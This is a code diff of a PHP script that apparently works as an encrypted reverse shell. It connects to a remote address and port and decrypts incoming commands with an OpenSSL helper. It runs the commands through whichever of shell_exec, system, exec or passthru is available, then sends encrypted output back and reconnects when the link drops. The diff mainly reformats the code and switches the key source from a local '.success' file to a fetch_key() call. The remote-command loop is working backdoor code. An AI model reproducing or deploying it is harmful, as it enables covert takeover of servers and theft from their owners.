@@ -21,28 +21,28 @@
 
 	(@$result = socket_connect($socket, $addr, $port)) or die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");
 
-	if(!file_exists('.success')){
-		die("!! auth key is missing !!\n");
-	} else {
-		$key = file_get_contents(".success");
-	}
+
 	require_once 'Openssl_EncryptDecrypt.php';
 	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
-	define('ENCRYPTION_KEY', base64_decode($key));
 
+	if(($key = $openssl_encrypt_decrypt->fetch_key()) !== false){
+		define('ENCRYPTION_KEY', $key);
+	} else {
+		die('!! failed to fetch key.');
+	}
 
+	
 	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
-	while (true) {
 
+	while (true)
+	{
 		$now = date('d/m H:i:s');
-
 	    if(! ($recv = socket_read($socket, 4096)) || $recv === "")
 	    {
 	    	// try to reconnect - 10 sec interval
-
 	    	echo "[\33[91m!\33[0m] Empty stream.. Disconnected.\n";
-	    	sleep(3);
-
+			sleep(3);
+			
     		if (! ($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))) {
 	     		 echo "[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n";
 			}
@@ -52,85 +52,65 @@
 			if (! (@$result = socket_connect($socket, $addr, $port))){
 			    echo "[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n";
 			} 
-
-			else echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
-
-	    }
+			else  {
+				echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
+			}
+		}
 	    else
 	    {
 			$recv = $openssl_encrypt_decrypt->decrypt_cbc($recv, ENCRYPTION_KEY);
 
-			
-	    	if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
-	    	{
+	    	if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE)){
 	    		break;
 	    	}
 
 			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($recv));
 			$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";
 
-			if(function_exists('shell_exec'))
-			{
+			if(function_exists('shell_exec')){
 				$fnc = "shell_exec()";
-				if(($result = shell_exec($full_cmd)) === null)
-				{
+				if(($result = shell_exec($full_cmd)) === null){
 					$result = "Error";
 				}
-			}
 
-			else if(function_exists('system'))
-			{ 	
+			} else if(function_exists('system')){ 	
 				$fnc = "system()";
 				@ob_start(); 	
 
-				if(! ($result = @system($full_cmd)))
-				{
+				if(! ($result = @system($full_cmd))){
 					$result = "Error";
 				}
 
 				$result = @ob_get_contents(); 		
 				@ob_end_clean(); 
-			}
 
-			else if(function_exists('exec'))
-			{ 
+			} else if(function_exists('exec')){ 
 				$fnc = "exec()";
 				@exec($full_cmd,$results,$ret_status);
 
-				if($ret_status !== 0)
-				{
+				if($ret_status !== 0){
 					$result = "Error status: ". $ret_status;
 				}
-
 				$result = ""; 		
-
-				foreach($results as $res)
-				{ 			
+				foreach($results as $res){ 			
 					$result .= $res."\n\r"; 		
 				} 
-			}
 
-			else if(function_exists('passthru'))
-			{ 		
+			} else if(function_exists('passthru')){ 		
 				$fnc = "passthru()";
 				@ob_start(); 		
 				@passthru($full_cmd); 		
 				$result = @ob_get_contents(); 		
 				@ob_end_clean(); 
-			}
 
-			else
-			{
+			} else {
 				$result = "Error :: System calls disabled..";
 			}
-			
 
 			$result .= "\n\rexecuted:: $fnc\n\rcmd:: $full_cmd";
 			$result = $openssl_encrypt_decrypt->encrypt_cbc($result, ENCRYPTION_KEY);
 
-
-    		if(! socket_write($socket, $result ,strlen($result)))
-    		{	
+    		if(! socket_write($socket, $result ,strlen($result))){	
     			continue;
 	        }
 	    }
